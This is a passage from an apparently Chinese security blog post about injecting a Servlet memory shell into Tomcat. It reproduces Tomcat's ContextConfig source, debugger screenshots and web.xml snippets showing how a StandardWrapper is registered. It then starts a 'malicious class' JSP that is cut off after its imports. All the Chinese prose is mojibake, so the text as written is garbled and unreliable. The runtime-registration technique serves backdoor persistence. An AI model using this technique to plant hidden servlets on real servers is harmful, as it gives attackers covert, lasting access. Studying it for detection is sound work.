href="#åˆ›å»ºä¸è£…è½½-StandardWrapper" class="headerlink" title="åˆ›å»ºä¸è£…è½½ StandardWrapper"></a>åˆ›å»ºä¸è£…è½½ StandardWrapper</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ContextConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">LifecycleListener</span> &#123;<br>    ...<br>    <span class="hljs-comment">//å°†è§£æå¥½çš„ web.xml é…ç½®åˆ° web åº”ç”¨</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br><br>        <span class="hljs-comment">// Everything else in order</span><br>        context.setEffectiveMajorVersion(webxml.getMajorVersion());<br>        context.setEffectiveMinorVersion(webxml.getMinorVersion());<br><br>        <span class="hljs-comment">//å‚æ•°å’ŒåŸºç¡€å±æ€§é…ç½®</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getContextParams().entrySet()) &#123;<br>            context.addParameter(entry.getKey(), entry.getValue());<br>        &#125;<br>        context.setDenyUncoveredHttpMethods(webxml.getDenyUncoveredHttpMethods());<br>        context.setDisplayName(webxml.getDisplayName());<br>        context.setDistributable(webxml.isDistributable());<br><br>        <span class="hljs-comment">//JNDI èµ„æºé…ç½®</span><br>        <span class="hljs-keyword">for</span> (ContextLocalEjb ejbLocalRef : webxml.getEjbLocalRefs().values()) &#123;<br>            context.getNamingResources().addLocalEjb(ejbLocalRef);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ContextEjb ejbRef : webxml.getEjbRefs().values()) &#123;<br>            context.getNamingResources().addEjb(ejbRef);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ContextEnvironment environment : webxml.getEnvEntries().values()) &#123;<br>            context.getNamingResources().addEnvironment(environment);<br>        &#125;<br>        <br>        <span class="hljs-comment">//Web ç»„ä»¶é…ç½®</span><br>        <span class="hljs-comment">//é”™è¯¯é¡µé¢</span><br>        <span class="hljs-keyword">for</span> (ErrorPage errorPage : webxml.getErrorPages().values()) &#123;<br>            context.addErrorPage(errorPage);<br>        &#125;<br>        <span class="hljs-comment">//Filter é…ç½®</span><br>        <span class="hljs-keyword">for</span> (FilterDef filter : webxml.getFilters().values()) &#123;<br>            <span class="hljs-keyword">if</span> (filter.getAsyncSupported() == <span class="hljs-literal">null</span>) &#123;<br>                filter.setAsyncSupported(<span class="hljs-string">&quot;false&quot;</span>);<br>            &#125;<br>            context.addFilterDef(filter);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : webxml.getFilterMappings()) &#123;<br>            context.addFilterMap(filterMap);<br>        &#125;<br>        context.setJspConfigDescriptor(webxml.getJspConfigDescriptor());<br>        <span class="hljs-comment">//listener é…ç½®</span><br>        <span class="hljs-keyword">for</span> (String listener : webxml.getListeners()) &#123;<br>            context.addApplicationListener(listener);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getLocaleEncodingMappings().entrySet()) &#123;<br>            context.addLocaleEncodingMappingParameter(entry.getKey(), entry.getValue());<br>        &#125;<br>        <span class="hljs-comment">// Prevents IAE</span><br>        <span class="hljs-keyword">if</span> (webxml.getLoginConfig() != <span class="hljs-literal">null</span>) &#123;<br>            context.setLoginConfig(webxml.getLoginConfig());<br>        &#125;<br>        <span class="hljs-keyword">for</span> (MessageDestinationRef mdr : webxml.getMessageDestinationRefs().values()) &#123;<br>            context.getNamingResources().addMessageDestinationRef(mdr);<br>        &#125;<br><br>        <span class="hljs-comment">// messageDestinations were ignored in Tomcat 6, so ignore here</span><br><br>        context.setIgnoreAnnotations(webxml.isMetadataComplete());<br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getMimeMappings().entrySet()) &#123;<br>            context.addMimeMapping(entry.getKey(), entry.getValue());<br>        &#125;<br>        context.setRequestCharacterEncoding(webxml.getRequestCharacterEncoding());<br>        <span class="hljs-comment">// Name is just used for ordering</span><br>        <span class="hljs-keyword">for</span> (ContextResourceEnvRef resource : webxml.getResourceEnvRefs().values()) &#123;<br>            context.getNamingResources().addResourceEnvRef(resource);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ContextResource resource : webxml.getResourceRefs().values()) &#123;<br>            context.getNamingResources().addResource(resource);<br>        &#125;<br>        context.setResponseCharacterEncoding(webxml.getResponseCharacterEncoding());<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">allAuthenticatedUsersIsAppRole</span> <span class="hljs-operator">=</span><br>                webxml.getSecurityRoles().contains(SecurityConstraint.ROLE_ALL_AUTHENTICATED_USERS);<br>        <span class="hljs-keyword">for</span> (SecurityConstraint constraint : webxml.getSecurityConstraints()) &#123;<br>            <span class="hljs-keyword">if</span> (allAuthenticatedUsersIsAppRole) &#123;<br>                constraint.treatAllAuthenticatedUsersAsApplicationRole();<br>            &#125;<br>            context.addConstraint(constraint);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (String role : webxml.getSecurityRoles()) &#123;<br>            context.addSecurityRole(role);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ContextService service : webxml.getServiceRefs().values()) &#123;<br>            context.getNamingResources().addService(service);<br>        &#125;<br>        <span class="hljs-comment">/* æ ¸å¿ƒéƒ¨åˆ† -- Servlet é…ç½® */</span><br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br>            <span class="hljs-comment">//åˆ›å»º Servlet åŒ…è£…å™¨ wrapper</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br>            <span class="hljs-comment">// Description is ignored</span><br>            <span class="hljs-comment">// Display name is ignored</span><br>            <span class="hljs-comment">// Icons are ignored</span><br><br>            <span class="hljs-comment">// jsp-file gets passed to the JSP Servlet as an init-param</span><br><br>            <span class="hljs-comment">//è®¾ç½®å¯åŠ¨åŠ è½½é¡ºåº</span><br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-comment">//è®¾ç½® Servlet å¯ç”¨çŠ¶æ€</span><br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br>            <span class="hljs-comment">//è·å– Servlet åç§°</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            <span class="hljs-comment">//è·å–è¿è¡Œèº«ä»½</span><br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(roleRef.getName(), roleRef.getLink());<br>            &#125;<br>            <span class="hljs-comment">//è·å– Servlet ç±»å</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            <span class="hljs-comment">//é…ç½®æ–‡ä»¶ä¸Šä¼ è®¾ç½®</span><br>            <span class="hljs-type">MultipartDef</span> <span class="hljs-variable">multipartdef</span> <span class="hljs-operator">=</span> servlet.getMultipartDef();<br>            <span class="hljs-keyword">if</span> (multipartdef != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">maxFileSize</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">maxRequestSize</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">fileSizeThreshold</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != multipartdef.getMaxFileSize()) &#123;<br>                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != multipartdef.getMaxRequestSize()) &#123;<br>                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;<br>                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());<br>                &#125;<br><br>                wrapper.setMultipartConfigElement(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartConfigElement</span>(multipartdef.getLocation(), maxFileSize,<br>                        maxRequestSize, fileSizeThreshold));<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getAsyncSupported() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setAsyncSupported(servlet.getAsyncSupported().booleanValue());<br>            &#125;<br>            wrapper.setOverridable(servlet.isOverridable());<br>            context.addChild(wrapper);<br>        &#125;<br>        <span class="hljs-comment">//Servlet URL æ˜ å°„ é…ç½®è·¯å¾„</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getServletMappings().entrySet()) &#123;<br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        <span class="hljs-comment">//Session é…ç½®</span><br>        <span class="hljs-type">SessionConfig</span> <span class="hljs-variable">sessionConfig</span> <span class="hljs-operator">=</span> webxml.getSessionConfig();<br>        <span class="hljs-keyword">if</span> (sessionConfig != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (sessionConfig.getSessionTimeout() != <span class="hljs-literal">null</span>) &#123;<br>                context.setSessionTimeout(sessionConfig.getSessionTimeout().intValue());<br>            &#125;<br>            <span class="hljs-type">SessionCookieConfig</span> <span class="hljs-variable">scc</span> <span class="hljs-operator">=</span> context.getServletContext().getSessionCookieConfig();<br>            scc.setName(sessionConfig.getCookieName());<br>            scc.setDomain(sessionConfig.getCookieDomain());<br>            scc.setPath(sessionConfig.getCookiePath());<br>            scc.setComment(sessionConfig.getCookieComment());<br>            <span class="hljs-keyword">if</span> (sessionConfig.getCookieHttpOnly() != <span class="hljs-literal">null</span>) &#123;<br>                scc.setHttpOnly(sessionConfig.getCookieHttpOnly().booleanValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (sessionConfig.getCookieSecure() != <span class="hljs-literal">null</span>) &#123;<br>                scc.setSecure(sessionConfig.getCookieSecure().booleanValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (sessionConfig.getCookieMaxAge() != <span class="hljs-literal">null</span>) &#123;<br>                scc.setMaxAge(sessionConfig.getCookieMaxAge().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!sessionConfig.getSessionTrackingModes().isEmpty()) &#123;<br>                context.getServletContext().setSessionTrackingModes(sessionConfig.getSessionTrackingModes());<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// Context doesn&#x27;t use version directly</span><br><br>        <span class="hljs-keyword">for</span> (String welcomeFile : webxml.getWelcomeFiles()) &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * The following will result in a welcome file of &quot;&quot; so don&#x27;t add that to the context &lt;welcome-file-list&gt;</span><br><span class="hljs-comment">             * &lt;welcome-file/&gt; &lt;/welcome-file-list&gt;</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">if</span> (welcomeFile != <span class="hljs-literal">null</span> &amp;&amp; !welcomeFile.isEmpty()) &#123;<br>                context.addWelcomeFile(welcomeFile);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// Do this last as it depends on servlets</span><br>        <span class="hljs-comment">//JSP å±æ€§ å¤„ç†</span><br>        <span class="hljs-keyword">for</span> (JspPropertyGroup jspPropertyGroup : webxml.getJspPropertyGroups()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">jspServletName</span> <span class="hljs-operator">=</span> context.findServletMapping(<span class="hljs-string">&quot;*.jsp&quot;</span>);<br>            <span class="hljs-keyword">if</span> (jspServletName == <span class="hljs-literal">null</span>) &#123;<br>                jspServletName = <span class="hljs-string">&quot;jsp&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (context.findChild(jspServletName) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">for</span> (String urlPattern : jspPropertyGroup.getUrlPatterns()) &#123;<br>                    context.addServletMappingDecoded(urlPattern, jspServletName, <span class="hljs-literal">true</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    <span class="hljs-keyword">for</span> (String urlPattern : jspPropertyGroup.getUrlPatterns()) &#123;<br>                        log.debug(sm.getString(<span class="hljs-string">&quot;contextConfig.noJsp&quot;</span>, urlPattern, jspServletName));<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getPostConstructMethods().entrySet()) &#123;<br>            context.addPostConstructMethod(entry.getKey(), entry.getValue());<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getPreDestroyMethods().entrySet()) &#123;<br>            context.addPreDestroyMethod(entry.getKey(), entry.getValue());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="æ–­ç‚¹è°ƒè¯•ï¼š"><a href="#æ–­ç‚¹è°ƒè¯•ï¼š" class="headerlink" title="æ–­ç‚¹è°ƒè¯•ï¼š"></a>æ–­ç‚¹è°ƒè¯•ï¼š</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516206.png" alt="img"></p><p>æ­¤å¤„çš„ WebXml å’Œ StandardContext æ˜¯ Servlet æ³¨å†Œæ‰€éœ€çš„é…ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515854.png" alt="img"></p><p>ç»§ç»­è·Ÿåˆ°åˆ›å»º wrapperï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516930.png" alt="img"></p><p>æ ¹æ® StandardContext çš„å†…å®¹åˆ›å»º StandardWrapperï¼Œå°† Servlet æ”¾å…¥ wrapper ä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516538.png" alt="img"></p><p><strong>LoadOnStartup</strong> æ˜¯ Servlet çš„å¯åŠ¨é¡ºåºé…ç½®</p><p>åœ¨ web.xml ä¸­ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>  <span class="hljs-comment">&lt;!-- ç«‹å³åŠ è½½ --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LazyServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.LazyServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>  <span class="hljs-comment">&lt;!-- å»¶è¿ŸåŠ è½½ --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong>æ­£æ•°</strong>ï¼šå¯åŠ¨æ—¶æŒ‰æ•°å€¼é¡ºåºåˆå§‹åŒ–</li><li><strong>0 æˆ–æ­£æ•°</strong>ï¼šåº”ç”¨å¯åŠ¨æ—¶ç«‹å³åˆå§‹åŒ–</li><li><strong>è´Ÿæ•°</strong>ï¼šç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶æ‰åˆå§‹åŒ–</li><li><strong>æœªè®¾ç½®</strong>ï¼šé»˜è®¤ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶åˆå§‹åŒ–</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515552.png" alt="img"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">wrapper</span>.setName(servlet.getServletName());<br></code></pre></td></tr></table></figure><p>ç»™ wrapper è®¾ç½®ä¸€ä¸ªåå­—</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516381.png" alt="img"></p><p>ä»åˆ›å»º wrapper æ—¶è·å– servletName</p><p>servletName&#x3D;â€defaultâ€ï¼ˆè¿™äº›æ˜¯ç³»ç»Ÿå†…ç½®çš„ï¼Œéœ€è¦è·³è¿‡ä¹‹åï¼Œè·å–åˆ°æˆ‘ä»¬å†™å¥½çš„ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515376.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516901.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515652.png" alt="img"></p><p>æ­¤æ—¶è·å–çš„ Name ä¸º ServletTest</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516380.png" alt="img"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">wrapper</span>.setServletClass(servlet.getServletClass());<br></code></pre></td></tr></table></figure><p>è·å–å…¨ç±»å</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515705.png" alt="img"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">context.addChild(<span class="hljs-keyword">wrapper</span>);<br></code></pre></td></tr></table></figure><p>å°† wrapper æ”¾å…¥ context </p><p>è¿™ä¸€æ­¥ç›¸å½“äº web.xml ä¸­çš„ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.src.tomcatdemo.ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081517485.png" alt="img"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">context.addServletMappingDecoded(<span class="hljs-keyword">entry</span>.getKey(), <span class="hljs-keyword">entry</span>.getValue());<br></code></pre></td></tr></table></figure><p>è·å– Servlet çš„ URL æ˜ å°„</p><p>æ‰§è¡Œ web.xml ä¸­çš„ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/servlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç›®å‰ä¾æ—§æ˜¯ç³»ç»Ÿå†…ç½®çš„ jsp </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515796.png" alt="img"></p><p>è·å–åˆ°æˆ‘ä»¬å‰é¢å†™çš„æ¶æ„ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081517951.png" alt="img"></p><h4 id="æ€»ç»“ä¸€ä¸‹æ³¨å†Œçš„å¤§è‡´æµç¨‹ï¼š"><a href="#æ€»ç»“ä¸€ä¸‹æ³¨å†Œçš„å¤§è‡´æµç¨‹ï¼š" class="headerlink" title="æ€»ç»“ä¸€ä¸‹æ³¨å†Œçš„å¤§è‡´æµç¨‹ï¼š"></a>æ€»ç»“ä¸€ä¸‹æ³¨å†Œçš„å¤§è‡´æµç¨‹ï¼š</h4><ol><li>åˆ›å»ºä¸€ä¸ªåŒ…è£…å™¨ wrapper</li><li>è·å– Servlet åå­—</li><li>è·å– Servlet ç±»</li><li>å°† wrapper åŠ å…¥ context</li><li>è·å– URL æ˜ å°„</li></ol><h3 id="2-3-å†™æ¶æ„ç±»"><a href="#2-3-å†™æ¶æ„ç±»" class="headerlink" title="2.3 å†™æ¶æ„ç±»"></a>2.3 å†™æ¶æ„ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%--<br>Created by IntelliJ IDEA.<br>User: XVSHIFU<br>Date: <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">31</span><br>Time: <span class="hljs-number">13</span>:08<br>To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> 